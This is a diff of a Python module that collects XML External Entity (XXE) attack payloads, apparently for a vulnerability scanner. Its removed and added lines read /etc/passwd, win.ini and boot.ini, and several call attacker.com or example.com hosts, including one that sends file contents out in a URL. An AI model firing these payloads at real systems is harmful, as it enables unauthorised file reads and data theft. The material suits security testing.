@@ -1,46 +1,43 @@
 """
-XXE (XML External Entity) payload collection
+XXE payload collection with enhanced detection
 """
-
-from typing import List
 
 class XXEPayloads:
     """XXE payload collection"""
     
     @staticmethod
-    def get_basic_payloads() -> List[str]:
-        """Get basic XXE payloads"""
+    def get_basic_payloads():
+        """Get basic XXE payloads with unique markers"""
         return [
-            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
-            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
-            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
-            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>'
+            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY xxe_marker SYSTEM "file:///etc/passwd">]><root>&xxe_marker;</root>',
+            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY xxe_marker SYSTEM "file:///windows/win.ini">]><root>&xxe_marker;</root>',
+            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY xxe_marker SYSTEM "file:///etc/hosts">]><root>&xxe_marker;</root>',
+            '<?xml version="1.0"?><!DOCTYPE xxe_test [<!ENTITY xxe_marker SYSTEM "/etc/passwd">]><xxe_test>&xxe_marker;</xxe_test>',
+            '<!DOCTYPE xxe_test [<!ENTITY xxe_marker SYSTEM "file:///etc/passwd">]><xxe_test>&xxe_marker;</xxe_test>'
         ]
     
     @staticmethod
-    def get_blind_payloads() -> List[str]:
+    def get_blind_payloads():
         """Get blind XXE payloads"""
         return [
-            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>test</foo>',
-            '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><foo>test</foo>',
-            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><foo>test</foo>'
+            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY % xxe_param SYSTEM "http://xxe-test.example.com/xxe_marker.dtd">%xxe_param;]><root>xxe_test</root>',
+            '<!DOCTYPE xxe [<!ENTITY % xxe_param SYSTEM "http://xxe-callback.example.com/">%xxe_param;]><xxe>test</xxe>',
+            '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY % xxe_dtd SYSTEM "http://xxe-external.example.com/test.dtd">%xxe_dtd;%xxe_param;%xxe_exfil;]><xxe></xxe>'
         ]
     
     @staticmethod
-    def get_parameter_payloads() -> List[str]:
-        """Get XXE payloads for parameters"""
+    def get_parameter_payloads():
+        """Get XXE payloads for parameter injection"""
         return [
-            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
-            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            'file:///etc/passwd',
-            'file:///c:/windows/win.ini'
+            '<!ENTITY xxe_marker SYSTEM "file:///etc/passwd">',
+            '<!DOCTYPE xxe [<!ENTITY xxe_marker SYSTEM "file:///etc/passwd">]>',
+            '<?xml version="1.0"?><!ENTITY xxe_marker SYSTEM "/etc/passwd">',
+            '&xxe_marker;',
+            '%xxe_marker;'
         ]
     
     @staticmethod
-    def get_all_payloads() -> List[str]:
+    def get_all_payloads():
         """Get all XXE payloads"""
         payloads = []
         payloads.extend(XXEPayloads.get_basic_payloads())
